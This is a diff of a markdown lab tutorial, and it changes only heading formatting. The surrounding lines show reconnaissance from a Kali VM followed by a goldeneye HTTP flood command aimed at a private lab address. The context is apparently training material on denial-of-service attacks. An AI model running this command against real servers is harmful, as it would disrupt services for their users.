@@ -44,7 +44,7 @@ From your laptop, use Firefox to access the HTTP server, `http://192.168.234.129
 
 Go back to Kali VM to plan, prepare and attack a victim.  
 
-**Recce phase**
+***Recce phase***  
 *1. Where and what am I? (What is my IP?)*  
 ```sh
 $ hostname -I
@@ -88,7 +88,7 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 3.56 seconds
 ```
 
-**Attack phase**
+***Attack phase***  
 *4. Now start attacking the victim using `goldeneye`.*  
 ```sh
 $ ./goldeneye.py http://192.168.234.129:8288 -w 50 -s 100 -d
